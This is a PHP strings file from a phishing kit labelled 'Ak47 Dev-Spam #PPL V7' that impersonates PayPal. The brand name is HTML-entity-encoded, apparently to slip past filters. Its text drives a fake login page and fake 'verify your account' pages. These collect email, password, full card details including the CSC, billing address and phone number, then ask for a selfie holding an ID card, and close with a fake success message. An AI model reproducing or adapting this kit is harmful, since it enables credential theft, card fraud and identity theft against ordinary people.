<?php
/*
///////////////////////////////////////////////////////////////
//            _    _  _ ______   __      ___ __      __      //
//      /\   | |  | || |____  |  \ \    / / |\ \    / /      //
//     /  \  | | _| || |_  / /____\ \  / /| |_\ \  / /       //
//    / /\ \ | |/ /__   _|/ /______\ \/ / | '_ \ \/ /        // 
//   / ____ \|   <   | | / /        \  /  | |_) \  /         // 
//  /_/    \_\_|\_\  |_|/_/          \/   |_.__/ \/          // 
//                   _     Dev-Spam     _                    //
//                        #PPL V7                            //
///////////////////////////////////////////////////////////////  	
*/                                                    

session_start();
error_reporting(0); 
/////////// INDEX LOGIN ///////////////////////////////////////////
$DST_01 = "Log in to your &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Account";
$DST_02 = "Email";
$DST_03 = "Password";
$DST_04 = "Email address is required.";
$DST_05 = "Password is required.";
$DST_06 = "Log In";
$DST_07 = "Having trouble logging in?";
$DST_08 = "Sign Up";
$DST_09 = "Privacy";
$DST_10 = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;";
$DST_11 = "Copyright © 1999-".date('Y')." &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;&#x2E;&#x20;&#x41;&#x6C;&#x6C;&#x20;&#x72;&#x69;&#x67;&#x68;&#x74;&#x73;&#x20;&#x72;&#x65;&#x73;&#x65;&#x72;&#x76;&#x65;&#x64;&#x2E;";
$DST_12 = "Checking your info…";
$DST_13 = "Some of your info isn't correct. Please try again.";
/////////// INDEX/BILLING/CARDING/SUCCESS //////////////////////////////////////////
$DST_title         = "&#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; Safety & Security";
$DST_securityLock  = "Your security is our top priority";
$DST_verify        = "Verify your account";
$DST_pargraphe     = "Dear customer, please enter your account information correctly and match with your card information.";
$DST_update_card   = "Update Card Information";
$DST_cardholder    = "Cardholder Name";
$DST_cardnumber    = "Card Number";
$DST_expdate       = "Expiration Date";
$DST_csc           = "CSC (3 digits)";
$DST_update_bill   = "Update Billing Address";
$DST_fullname      = "Legal Full Name";
$DST_address       = "Address Line";
$DST_city          = "City";
$DST_state         = "State";
$DST_zipCode       = "Postal Code";
$DST_mobile        = "Mobile";
$DST_home          = "Home";
$DST_phoneNumber   = "Phone Number";
$DST_agree         = "By clicking Agree & Continue, I have read and agree to &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C;’s ";
$DST_user_agrement = "User Agreement";
$DST_privacy       = "Privacy Policy";
$DST_and           = " and ";
$DST_policy        = "Electronic Communications Delivery Policy";
$DST_submit        = "Αgree & Continue";
$DST_fPrivacy      = "Privacy";
$DST_flegal        = "Legal";
$DST_fHelpCenter   = "Help Center";
$DST_success       = "Congratulations !";
$DST_successp      = "Dear ".$_SESSION['_fullname_'].", your &#x50;&#x61;&#x79;&#x50;&#x61;&#x6C; account has been successfully verified. You will be redirected automatically to login page in 5 seconds.";
$DST_billing       = "Billing Address Information";
$DST_carding       = " Card Information";
/////////// INDEX CONFIRM IDENTITY ////////////////////////////////////////// 
$DST_id_title      = "Confirm your identity";
$DST_id_parag      = "Your identification documents will help us to validate your identity.";
$DST_id_ask        = "What i should to do, to confirm my identity?";
$DST_id_li_1       = "Take a selfie by holding your ID Card also your ";
$DST_id_li_2       = "Cardholder Name and ID Card should match and be clearly visible.";
$DST_id_li_3       = "Your identification document must be next to your face.";
$DST_id_example    = "Here's an example for picture :";
?>